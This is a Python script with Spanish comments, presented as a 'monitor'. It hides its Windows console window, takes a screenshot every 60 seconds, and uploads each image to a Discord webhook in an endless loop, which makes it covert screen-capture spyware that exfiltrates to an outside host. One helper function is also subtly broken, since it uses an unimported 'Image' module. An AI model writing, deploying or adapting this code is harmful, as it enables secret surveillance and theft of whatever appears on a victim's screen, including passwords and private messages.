import os
import sys
import time
import json
import io
import requests
from datetime import datetime
from PIL import ImageGrab
import ctypes
import tempfile
import logging
from pathlib import Path

# ========== OCULTAR CONSOLA ==========
def ocultar_consola():
    """Oculta la ventana de consola en Windows"""
    try:
        # Método 1: Usando ctypes
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        
        # Obtener handle de la consola
        hWnd = kernel32.GetConsoleWindow()
        
        # Ocultar ventana
        if hWnd:
            user32.ShowWindow(hWnd, 0)  # 0 = SW_HIDE
            
        # También ocultar de la barra de tareas
        user32.SetWindowLongW(hWnd, -20, 0x80)  # WS_EX_TOOLWINDOW
            
    except Exception as e:
        # Si falla, seguir ejecutando normalmente
        pass

# ========== CONFIGURACIÓN ==========
WEBHOOK_URL = "??????????????????????????????????????????????????????????????????"
LOG_FILE = Path(tempfile.gettempdir()) / "monitor.log"
MAX_LOG_SIZE = 10 * 1024 * 1024  # 10 MB

# ========== LOGGING ==========
def setup_logging():
    """Configurar sistema de logs"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(LOG_FILE, encoding='utf-8'),
        ]
    )
    return logging.getLogger(__name__)

# ========== FUNCIONES MEJORADAS ==========
class Monitor:
    def __init__(self):
        self.logger = setup_logging()
        self.contador_capturas = 0
        self.ultimo_envio = None
        
    def verificar_tamano_log(self):
        """Evitar que el log crezca demasiado"""
        try:
            if LOG_FILE.exists() and LOG_FILE.stat().st_size > MAX_LOG_SIZE:
                with open(LOG_FILE, 'w') as f:
                    f.write('')
                self.logger.info("Log truncado por tamaño excesivo")
        except:
            pass
    
    def optimizar_imagen(self, img_bytes):
        """Optimizar tamaño de imagen"""
        try:
            img = ImageGrab.grab()
            output = io.BytesIO()
            
            # Reducir calidad y tamaño
            img.thumbnail((1600, 900), Image.Resampling.LANCZOS)
            img.save(output, format='JPEG', quality=60, optimize=True)
            
            return output.getvalue()
        except:
            # Si falla la optimización, usar original
            original = io.BytesIO()
            img.save(original, format='JPEG', quality=85)
            return original.getvalue()
    
    def capturar_pantalla(self):
        """Captura con manejo de errores"""
        try:
            screenshot = ImageGrab.grab()
            
            # Optimizar imagen
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=70, optimize=True)
            img_bytes = img_bytes.getvalue()
            
            return img_bytes
        except Exception as e:
            self.logger.error(f"Error capturando pantalla: {e}")
            return None
    
    def enviar_discord(self, imagen_bytes):
        """Enviar captura a Discord"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"captura_{timestamp}.jpg"
            
            embed = {
                "title": "📸 Captura Automática",
                "description": f"Hora: {datetime.now().strftime('%H:%M:%S')}\n"
                             f"Captura #{self.contador_capturas}",
                "color": 0x5865F2,
                "timestamp": datetime.now().isoformat()
            }
            
            files = {'file': (filename, imagen_bytes, 'image/jpeg')}
            payload = {"embeds": [embed]}
            
            response = requests.post(
                WEBHOOK_URL,
                files=files,
                data={"payload_json": json.dumps(payload)},
                timeout=30
            )
            
            if response.status_code == 204 or response.status_code == 200:
                self.logger.info(f"Captura #{self.contador_capturas} enviada exitosamente")
                return True
            else:
                self.logger.error(f"Error Discord: {response.status_code}")
                return False
                
        except requests.exceptions.Timeout:
            self.logger.warning("Timeout al enviar a Discord")
            return False
        except Exception as e:
            self.logger.error(f"Error enviando a Discord: {e}")
            return False
    
    def ejecutar(self):
        """Bucle principal del monitor"""
        self.logger.info("=== Iniciando Monitor ===")
        
        while True:
            try:
                # Verificar tamaño de log
                self.verificar_tamano_log()
                
                # Capturar pantalla
                imagen = self.capturar_pantalla()
                
                if imagen:
                    # Incrementar contador
                    self.contador_capturas += 1
                    
                    # Enviar a Discord
                    if self.enviar_discord(imagen):
                        self.ultimo_envio = datetime.now()
                    
                    # Registrar en log local
                    self.logger.info(f"Captura tomada - Total: {self.contador_capturas}")
                
                # Esperar 60 segundos
                for i in range(60):
                    time.sleep(1)  # Sleep en pasos de 1 segundo
                    
            except KeyboardInterrupt:
                self.logger.info("Monitor detenido por usuario")
                break
            except Exception as e:
                self.logger.error(f"Error en bucle principal: {e}")
                time.sleep(30)

# ========== EJECUCIÓN ==========
if __name__ == "__main__":
    # Ocultar consola (solo Windows)
    if os.name == 'nt':
        ocultar_consola()
    
    # Crear e iniciar monitor
    monitor = Monitor()
    
    try:
        monitor.ejecutar()
    except Exception as e:
        # Loggear cualquier error no capturado
        with open(LOG_FILE, 'a') as f:
            f.write(f"\n[{datetime.now()}] ERROR CRÍTICO: {e}\n")